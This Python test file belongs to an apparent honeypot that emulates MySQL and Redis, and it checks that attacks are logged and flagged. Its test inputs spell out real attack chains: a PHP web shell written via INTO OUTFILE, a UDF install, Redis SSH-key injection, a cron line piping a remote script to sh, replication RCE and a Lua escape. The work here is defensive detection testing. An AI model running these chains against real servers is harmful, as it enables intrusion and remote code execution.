from __future__ import annotations

import asyncio
import struct

from honeynet.services.mysql import native_scramble
from conftest import read_events, running


# ------------------------------------------------------------------ MySQL client

async def mysql_connect(port, user, password, db=""):
    reader, writer = await asyncio.open_connection("127.0.0.1", port)
    head = await reader.readexactly(4)
    payload = await reader.readexactly(int.from_bytes(head[:3], "little"))
    assert payload[0] == 10
    ver_end = payload.index(b"\x00", 1)
    version = payload[1:ver_end].decode()
    off = ver_end + 1 + 4
    salt = payload[off:off + 8]
    off += 8 + 1 + 2 + 1 + 2 + 2 + 1 + 10
    salt += payload[off:off + 12]
    caps = 0x1 | 0x2 | 0x4 | (0x8 if db else 0) | 0x200 | 0x8000 | 0x80000
    resp = native_scramble(password, salt)
    body = (struct.pack("<IIB", caps, 1 << 24, 33) + b"\x00" * 23 + user.encode() + b"\x00" + bytes([len(resp)]) + resp
            + (db.encode() + b"\x00" if db else b"") + b"mysql_native_password\x00")
    writer.write(struct.pack("<I", len(body))[:3] + b"\x01" + body)
    await writer.drain()
    head = await reader.readexactly(4)
    reply = await reader.readexactly(int.from_bytes(head[:3], "little"))
    return reader, writer, reply, version


async def mysql_query(reader, writer, sql):
    body = b"\x03" + sql.encode()
    writer.write(struct.pack("<I", len(body))[:3] + b"\x00" + body)
    await writer.drain()
    out = b""
    while True:
        try:
            chunk = await asyncio.wait_for(reader.read(65536), 0.5)
        except asyncio.TimeoutError:
            break
        if not chunk:
            break
        out += chunk
    return out


async def test_mysql_denies_strong_password_but_recovers_weak_and_logs_hash(settings):
    async with running(settings, "mysql") as (svc, port):
        _, w, reply, version = await mysql_connect(port, "dbuser", "Zx9!notinanylist")
        assert reply[0] == 0xFF and b"Access denied for user 'dbuser'" in reply
        w.close()
        r, w, reply, _ = await mysql_connect(port, "root", "toor")
        assert reply[0] == 0x00, reply            # weak password for root accepted
        out = await mysql_query(r, w, "SELECT VERSION()")
        assert b"5.7.42" in out
        out = await mysql_query(r, w, "show databases")
        assert b"app_prod" in out
        out = await mysql_query(r, w, "SELECT '<?php system($_GET[0]); ?>' INTO OUTFILE '/var/www/html/s.php'")
        assert out[4] == 0xFF
        await mysql_query(r, w, "CREATE FUNCTION sys_exec RETURNS int SONAME 'udf.so'")
        w.close()
    assert version.startswith("5.7")
    evs = read_events(settings, "mysql")
    auth = [e["data"] for e in evs if e["event"] == "auth.attempt"]
    assert auth[0]["success"] is False and auth[0]["password_recovered"] is False
    assert auth[0]["hash"].startswith("$mysqlna$") and "*" in auth[0]["hash"]
    assert auth[1]["success"] is True and auth[1]["password"] == "toor" and auth[1]["password_recovered"] is True
    qs = [e["data"]["query"] for e in evs if e["event"] == "db.query"]
    assert any("INTO OUTFILE" in q for q in qs)
    rules = {e["data"]["rule"] for e in evs if e["event"] == "exploit.attempt"}
    assert {"mysql-file-write", "mysql-udf-install"} <= rules


async def test_mysql_garbage_does_not_crash(settings):
    async with running(settings, "mysql") as (svc, port):
        reader, writer = await asyncio.open_connection("127.0.0.1", port)
        await reader.read(200)
        writer.write(b"\xff" * 3 + b"\x01" + b"\x00" * 5)
        await writer.drain()
        await asyncio.sleep(0.2)
        writer.close()
        r2, w2, reply, _ = await mysql_connect(port, "root", "root")
        assert reply[0] in (0x00, 0xFF)
        w2.close()


# ------------------------------------------------------------------- Redis

def resp(*args: str) -> bytes:
    return f"*{len(args)}\r\n".encode() + b"".join(f"${len(a.encode())}\r\n{a}\r\n".encode() for a in args)


async def redis_talk(port, *commands: bytes) -> list[bytes]:
    reader, writer = await asyncio.open_connection("127.0.0.1", port)
    outs = []
    for c in commands:
        writer.write(c)
        await writer.drain()
        try:
            outs.append(await asyncio.wait_for(reader.read(65536), 1.0))
        except asyncio.TimeoutError:
            outs.append(b"")
    writer.close()
    return outs


async def test_redis_basic_and_exploit_chain_detection(settings):
    key = "\n\nssh-rsa AAAAB3NzaC1yc2E attacker@evil\n\n"
    cron = "\n\n*/1 * * * * curl -s http://203.0.113.9/x.sh | sh\n\n"
    async with running(settings, "redis") as (svc, port):
        outs = await redis_talk(
            port, resp("PING"), b"INFO\r\n", resp("CONFIG", "GET", "dir"), resp("CONFIG", "SET", "dir", "/root/.ssh"),
            resp("CONFIG", "SET", "dbfilename", "authorized_keys"), resp("SET", "x", key), resp("SAVE"),
            resp("SET", "y", cron), resp("CONFIG", "SET", "dir", "/var/spool/cron"),
            resp("SLAVEOF", "203.0.113.77", "6379"), resp("MODULE", "LOAD", "/tmp/exp.so"),
            resp("EVAL", "return os.execute('id')", "0"), resp("AUTH", "hunter2"), resp("GET", "x"), b"FLUSHALL\r\n",
            resp("BOGUS", "a"))
    assert outs[0] == b"+PONG\r\n" and b"redis_version:5.0.7" in outs[1]
    assert b"/var/lib/redis" in outs[2] and outs[3] == b"+OK\r\n"
    assert outs[12].startswith(b"-ERR Client sent AUTH") and outs[15].startswith(b"-ERR unknown command 'BOGUS'")
    evs = read_events(settings, "redis")
    rules = {e["data"]["rule"] for e in evs if e["event"] == "exploit.attempt"}
    assert {"redis-config-dir-write", "redis-config-dbfilename", "redis-ssh-key-inject", "redis-cron-payload",
            "redis-replication-rce", "redis-module-load", "redis-lua-sandbox-escape", "redis-flush"} <= rules
    assert any(e["event"] == "download.attempt" and "203.0.113.9" in e["data"]["url"] for e in evs)
    auth = [e["data"] for e in evs if e["event"] == "auth.attempt"]
    assert auth and auth[0]["password"] == "hunter2"
    cmds = [e["data"]["command"] for e in evs if e["event"] == "db.query"]
    assert cmds[:3] == ["ping", "info", "config"]


async def test_redis_protocol_abuse_is_contained(settings):
    async with running(settings, "redis") as (svc, port):
        outs = await redis_talk(port, b"*99999999\r\n", )
        assert outs[0].startswith(b"-ERR Protocol error")
        outs = await redis_talk(port, b"*1\r\n$99999999999\r\n", )
        assert outs[0].startswith(b"-ERR Protocol error")
        outs = await redis_talk(port, resp("PING"))
        assert outs[0] == b"+PONG\r\n"      # service still healthy
